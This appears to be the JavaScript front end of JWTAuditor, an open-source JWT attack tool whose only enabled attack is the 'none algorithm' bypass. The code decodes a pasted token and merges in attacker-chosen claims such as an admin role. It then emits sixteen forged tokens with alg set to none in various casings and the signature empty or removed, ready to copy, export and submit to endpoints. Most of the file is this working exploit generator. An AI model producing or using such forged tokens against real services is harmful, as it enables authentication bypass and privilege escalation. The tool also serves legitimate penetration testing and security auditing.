/*!
 * JWTAuditor - JWT Attack Platform (Production Version)
 * https://github.com/dr34mhacks/jwtauditor
 * Copyright (c) 2025 Sid Joshi (@dr34mhacks)
 * Licensed under Apache-2.0 License
 */


// Production JWT Attack Platform - Only None Algorithm Bypass enabled
window.jwtAttackPlatform = {
    currentStep: 'attack-selection',
    selectedAttack: null,
    generatedPayloads: [],
    
    init: function() {
        this.setupEvents();
        this.disableUnavailableAttacks();
    },
    
    setupEvents: function() {
        document.addEventListener('click', (e) => {
            // Check if in attacks tab
            const attacksTab = document.getElementById('attacks');
            if (!attacksTab || !attacksTab.classList.contains('active')) {
                return;
            }
            
            // Handle back button clicks
            if (e.target.id === 'attack-back-btn' || e.target.closest('#attack-back-btn')) {
                this.goBack();
                return;
            }
            
            // Handle results back button
            if (e.target.id === 'results-back-btn' || e.target.closest('#results-back-btn')) {
                this.backToConfiguration();
                return;
            }
            
            // Handle generate attack button
            if (e.target.classList.contains('generate-attack-btn')) {
                this.generateAttackPayloads();
                return;
            }
            
            // Handle copy payload button
            if (e.target.classList.contains('copy-payload-icon') || e.target.closest('.copy-payload-icon')) {
                const button = e.target.classList.contains('copy-payload-icon') ? e.target : e.target.closest('.copy-payload-icon');
                const payload = decodeURIComponent(button.dataset.payload);
                navigator.clipboard.writeText(payload).then(() => {
                    const originalHTML = button.innerHTML;
                    button.innerHTML = '<i class="fas fa-check"></i>';
                    setTimeout(() => {
                        button.innerHTML = originalHTML;
                    }, 2000);
                });
                return;
            }
            
            // Handle export buttons
            if (e.target.id === 'export-payloads' || e.target.textContent.includes('Export All Payloads')) {
                this.exportAllPayloads();
                return;
            }
            
            if (e.target.id === 'export-clean-payloads' || e.target.textContent.includes('Export Clean Tokens')) {
                this.exportCleanTokens();
                return;
            }
            
            if (e.target.id === 'generate-new-attack' || e.target.textContent.includes('Generate New Attack')) {
                this.goBack();
                return;
            }
            
            // Handle attack cards - only allow none-bypass
            const card = e.target.closest('.attack-card');
            if (card && !card.classList.contains('disabled')) {
                const attackType = card.dataset.attack;
                
                // Only allow none-bypass attack
                if (attackType === 'none-bypass') {
                    // Select the card
                    document.querySelectorAll('.attack-card').forEach(c => c.classList.remove('selected'));
                    card.classList.add('selected');
                    
                    this.selectedAttack = attackType;
                    
                    // Show configuration
                    setTimeout(() => {
                        this.showConfiguration();
                    }, 300);
                } else {
                    // Show unavailable message for other attacks
                    this.showUnavailableMessage(attackType);
                }
            }
        });
        
        // Add change event listener for checkboxes
        document.addEventListener('change', (e) => {
            // Handle payload modification checkbox for none bypass
            if (e.target.id === 'modify-payload-none') {
                const customClaimsContainer = document.getElementById('custom-claims-container-none');
                if (customClaimsContainer) {
                    customClaimsContainer.style.display = e.target.checked ? 'block' : 'none';
                }
            }
        });
    },
    
    disableUnavailableAttacks: function() {
        // Disable all attack cards except none-bypass
        const attackCards = document.querySelectorAll('.attack-card');
        attackCards.forEach(card => {
            const attackType = card.dataset.attack;
            if (attackType !== 'none-bypass') {
                card.classList.add('disabled');
                card.style.opacity = '0.5';
                card.style.cursor = 'not-allowed';
                
                // Add "Coming Soon" badge
                if (!card.querySelector('.coming-soon-badge')) {
                    const badge = document.createElement('div');
                    badge.className = 'coming-soon-badge';
                    badge.innerHTML = 'üîí Coming Soon';
                    card.style.position = 'relative';
                    card.appendChild(badge);
                }
            }
        });
    },
    
    showUnavailableMessage: function(attackType) {
        const attackNames = {
            'algo-confusion': 'Algorithm Confusion',
            'kid-injection': 'Kid Parameter Injection',
            'jku-manipulation': 'JKU/X5U Manipulation',
            'jwk-injection': 'JWK Header Injection',
            'privilege-escalation': 'Privilege Escalation',
            'claim-spoofing': 'Claim Spoofing'
        };
        
        const attackName = attackNames[attackType] || 'This attack';
        
        // Create modal or notification
        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: var(--dark-surface);
            border: 2px solid var(--primary-color);
            border-radius: 8px;
            padding: 20px;
            max-width: 400px;
            text-align: center;
            z-index: 1000;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
        `;
        
        notification.innerHTML = `
            <h3 style="color: var(--primary-color); margin-bottom: 15px;">üîí Attack Coming Soon</h3>
            <p style="color: var(--text-primary); margin-bottom: 15px;">
                <strong>${attackName}</strong> is currently under development and will be available in a future update.
            </p>
            <p style="color: var(--text-secondary); font-size: 14px; margin-bottom: 20px;">
                For now, you can use the <strong>None Algorithm Bypass</strong> attack which is fully functional.
            </p>
            <button onclick="this.parentElement.remove()" style="
                background: var(--primary-color);
                color: white;
                border: none;
                padding: 10px 20px;
                border-radius: 4px;
                cursor: pointer;
            ">OK</button>
        `;
        
        document.body.appendChild(notification);
        
        // Auto-remove after 5 seconds
        setTimeout(() => {
            if (notification.parentElement) {
                notification.remove();
            }
        }, 5000);
    },
    
    showConfiguration: function() {
        const attackSelection = document.getElementById('attack-selection');
        const attackConfiguration = document.getElementById('attack-configuration');
        const configContent = document.getElementById('attack-config-content');
        const configTitle = document.getElementById('attack-config-title');
        
        if (!attackSelection || !attackConfiguration || !configContent || !configTitle) {
            return;
        }
        
        // Hide selection, show configuration
        attackSelection.classList.remove('active');
        attackConfiguration.classList.add('active');
        
        // Update current step
        this.currentStep = 'attack-configuration';
        
        // Generate configuration based on selected attack
        if (this.selectedAttack === 'none-bypass') {
            configTitle.textContent = 'Configure None Algorithm Bypass';
            configContent.innerHTML = this.generateNoneBypassConfig();
        }
    },
    
    generateNoneBypassConfig: function() {
        return `
            <div class="config-section">
                <h4>üö´ None Algorithm Bypass Attack</h4>
                <p class="attack-description">
                    This attack removes signature verification by setting the algorithm to "none". 
                    Many JWT libraries will accept tokens with alg: "none" and skip signature validation entirely.
                </p>
                
                <div class="config-group">
                    <label for="original-token-none">Original JWT Token *</label>
                    <textarea id="original-token-none" placeholder="Paste your JWT token here..." rows="4"></textarea>
                    <small class="field-hint">üìù Paste the JWT token you want to modify</small>
                </div>
                
                <div class="config-group">
                    <label class="checkbox-label">
                        <input type="checkbox" id="modify-payload-none">
                        <span class="checkmark"></span>
                        Modify Payload Claims
                    </label>
                    <small class="field-hint">üîß Check this to add or modify claims in the payload</small>
                </div>
                
                <div class="config-group" id="custom-claims-container-none" style="display: none;">
                    <label for="custom-claims-none">Custom Claims (JSON)</label>
                    <textarea id="custom-claims-none" placeholder='{"sub": "admin", "role": "administrator"}' rows="3"></textarea>
                    <small class="field-hint">üéØ Add custom claims in JSON format. These will be merged with existing payload.</small>
                </div>
                
                <div class="config-actions">
                    <button class="generate-attack-btn primary-btn">
                        <i class="fas fa-rocket"></i> Generate None Bypass Payloads
                    </button>
                </div>
            </div>
        `;
    },
    
    generateAttackPayloads: function() {
        if (this.selectedAttack === 'none-bypass') {
            this.generateNoneBypassPayloads();
        }
        
        if (this.generatedPayloads.length > 0) {
            this.showResults();
        }
    },
    
    generateNoneBypassPayloads: function() {
        const token = document.getElementById('original-token-none')?.value?.trim();
        const modifyPayload = document.getElementById('modify-payload-none')?.checked;
        const customClaims = document.getElementById('custom-claims-none')?.value?.trim();
        
        if (!token) {
            this.showError('Please provide the original JWT token');
            return;
        }
        
        try {
            const decodedToken = this.decodeJWT(token);
            this.generatedPayloads = [];
            
            // Prepare payload variations
            let basePayload = { ...decodedToken.payload };
            
            // Apply custom claims if specified
            if (modifyPayload && customClaims) {
                try {
                    const cleanedClaims = customClaims.trim();
                    const additionalClaims = JSON.parse(cleanedClaims);
                    basePayload = { ...basePayload, ...additionalClaims };
                } catch (e) {
                    this.showError(`Invalid JSON in custom claims: ${e.message}. Please check your JSON format.`);
                }
            }
            
            // Generate none algorithm variations
            const noneVariations = [
                { alg: 'none', description: 'Standard none algorithm' },
                { alg: 'None', description: 'Capitalized None' },
                { alg: 'NONE', description: 'Uppercase NONE' },
                { alg: 'nOnE', description: 'Mixed case nOnE' }
            ];
            
            noneVariations.forEach(variation => {
                const header = { ...decodedToken.header, alg: variation.alg };
                
                // Remove typ if present (some implementations are stricter)
                const headerWithoutTyp = { ...header };
                delete headerWithoutTyp.typ;
                
                // Generate tokens with and without signature
                [header, headerWithoutTyp].forEach((headerVariant, index) => {
                    const encodedHeader = this.base64UrlEncode(JSON.stringify(headerVariant));
                    const encodedPayload = this.base64UrlEncode(JSON.stringify(basePayload));
                    
                    // Token without signature
                    const tokenWithoutSig = `${encodedHeader}.${encodedPayload}.`;
                    
                    // Token with empty signature  
                    const tokenWithEmptySig = `${encodedHeader}.${encodedPayload}`;
                    
                    const headerType = index === 0 ? 'with typ' : 'without typ';
                    
                    this.generatedPayloads.push({
                        title: `üö´ None Algorithm (${variation.description}, ${headerType}) - No Signature`,
                        payload: tokenWithoutSig,
                        description: `None algorithm bypass using alg: "${variation.alg}" ${headerType}, ending with empty signature`,
                        explanation: `This payload removes signature verification by setting algorithm to "${variation.alg}". The token ends with a period and empty signature section.`,
                        testMethod: 'Submit this token to endpoints that normally require JWT signature verification.'
                    });
                    
                    this.generatedPayloads.push({
                        title: `üö´ None Algorithm (${variation.description}, ${headerType}) - Missing Signature`,
                        payload: tokenWithEmptySig,
                        description: `None algorithm bypass using alg: "${variation.alg}" ${headerType}, completely missing signature section`,
                        explanation: `This payload removes signature verification by setting algorithm to "${variation.alg}". The token has no signature section at all.`,
                        testMethod: 'Submit this token to endpoints that normally require JWT signature verification.'
                    });
                });
            });
            
        } catch (error) {
            this.showError(`Failed to process none algorithm bypass: ${error.message}`);
        }
    },
    
    showResults: function() {
        const attackConfiguration = document.getElementById('attack-configuration');
        const attackResults = document.getElementById('attack-results');
        const resultsContent = document.getElementById('attack-results-content');
        
        if (!attackConfiguration || !attackResults || !resultsContent) {
            return;
        }
        
        // Hide configuration, show results
        attackConfiguration.classList.remove('active');
        attackResults.classList.add('active');
        
        // Update current step
        this.currentStep = 'attack-results';
        
        // Generate results HTML
        let html = `
            <div class="results-summary">
                <h4>üéØ Generated ${this.generatedPayloads.length} Attack Payloads</h4>
                <p>Each payload below represents a different variation of the ${this.selectedAttack} attack.</p>
            </div>
        `;
        
        this.generatedPayloads.forEach((payloadData, index) => {
            html += `
                <div class="payload-result">
                    <h5 class="payload-title">${payloadData.title}</h5>
                    <div class="payload-container">
                        <div class="payload-token">${payloadData.payload}</div>
                        <button class="copy-payload-icon" data-payload="${encodeURIComponent(payloadData.payload)}" title="Copy payload">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                    <div class="payload-info">
                        <div class="payload-description">
                            <strong>Description:</strong> ${payloadData.description}
                        </div>
                        <div class="payload-explanation">
                            <strong>How it works:</strong> ${payloadData.explanation}
                        </div>
                        <div class="payload-test-method">
                            <strong>Testing method:</strong> ${payloadData.testMethod}
                        </div>
                    </div>
                </div>
            `;
        });
        
        resultsContent.innerHTML = html;
    },
    
    goBack: function() {
        if (this.currentStep === 'attack-configuration') {
            // Go back to attack selection
            const attackConfiguration = document.getElementById('attack-configuration');
            const attackSelection = document.getElementById('attack-selection');
            
            if (attackConfiguration && attackSelection) {
                attackConfiguration.classList.remove('active');
                attackSelection.classList.add('active');
                this.currentStep = 'attack-selection';
                this.selectedAttack = null;
            }
        } else if (this.currentStep === 'attack-results') {
            // Go back to configuration
            this.backToConfiguration();
        }
    },
    
    backToConfiguration: function() {
        const attackResults = document.getElementById('attack-results');
        const attackConfiguration = document.getElementById('attack-configuration');
        
        if (attackResults && attackConfiguration) {
            attackResults.classList.remove('active');
            attackConfiguration.classList.add('active');
            this.currentStep = 'attack-configuration';
        }
    },
    
    exportAllPayloads: function() {
        if (this.generatedPayloads.length === 0) {
            this.showError('No payloads to export. Please generate attack payloads first.');
            return;
        }
        
        let exportContent = `JWT Attack Platform - ${this.selectedAttack} Export\n`;
        exportContent += `Generated: ${new Date().toLocaleString()}\n`;
        exportContent += `Total Payloads: ${this.generatedPayloads.length}\n\n`;
        exportContent += '=' .repeat(80) + '\n\n';
        
        this.generatedPayloads.forEach((payload, index) => {
            exportContent += `${index + 1}. ${payload.title}\n`;
            exportContent += `Description: ${payload.description}\n`;
            exportContent += `Explanation: ${payload.explanation}\n`;
            exportContent += `Testing: ${payload.testMethod}\n`;
            exportContent += `Payload: ${payload.payload}\n\n`;
            exportContent += '-'.repeat(80) + '\n\n';
        });
        
        this.downloadFile(exportContent, `jwt_attack_${this.selectedAttack}_${Date.now()}.txt`);
    },
    
    exportCleanTokens: function() {
        if (this.generatedPayloads.length === 0) {
            this.showError('No payloads to export. Please generate attack payloads first.');
            return;
        }
        
        let exportContent = '';
        
        this.generatedPayloads.forEach((payload, index) => {
            exportContent += `${payload.payload}\n`;
        });
        
        this.downloadFile(exportContent, `jwt_tokens_${this.selectedAttack}_${Date.now()}.txt`);
    },
    
    downloadFile: function(content, filename) {
        const blob = new Blob([content], { type: 'text/plain' });
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        window.URL.revokeObjectURL(url);
    },
    
    showError: function(message) {
        
        // Create or update error display
        let errorDiv = document.getElementById('attack-error-display');
        if (!errorDiv) {
            errorDiv = document.createElement('div');
            errorDiv.id = 'attack-error-display';
            errorDiv.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                background: #ff4757;
                color: white;
                padding: 15px;
                border-radius: 5px;
                max-width: 400px;
                z-index: 1000;
                box-shadow: 0 2px 10px rgba(0,0,0,0.2);
            `;
            document.body.appendChild(errorDiv);
        }
        
        errorDiv.innerHTML = `
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <span><i class="fas fa-exclamation-triangle"></i> ${message}</span>
                <button onclick="this.parentElement.parentElement.remove()" style="background: none; border: none; color: white; cursor: pointer; font-size: 16px;">√ó</button>
            </div>
        `;
        
        // Auto-remove after 5 seconds
        setTimeout(() => {
            if (errorDiv.parentElement) {
                errorDiv.remove();
            }
        }, 5000);
    },
    
    // Utility functions
    decodeJWT: function(token) {
        const parts = token.split('.');
        if (parts.length !== 3) {
            throw new Error('Invalid JWT format. Expected 3 parts separated by dots.');
        }
        
        try {
            const header = JSON.parse(this.base64UrlDecode(parts[0]));
            const payload = JSON.parse(this.base64UrlDecode(parts[1]));
            const signature = parts[2];
            
            return { header, payload, signature };
        } catch (error) {
            throw new Error(`Failed to decode JWT: ${error.message}`);
        }
    },
    
    base64UrlEncode: function(str) {
        return btoa(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
    },
    
    base64UrlDecode: function(str) {
        const padding = '='.repeat((4 - (str.length % 4)) % 4);
        return atob(str.replace(/-/g, '+').replace(/_/g, '/') + padding);
    }
};

// Initialize when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        window.jwtAttackPlatform.init();
    });
} else {
    window.jwtAttackPlatform.init();
}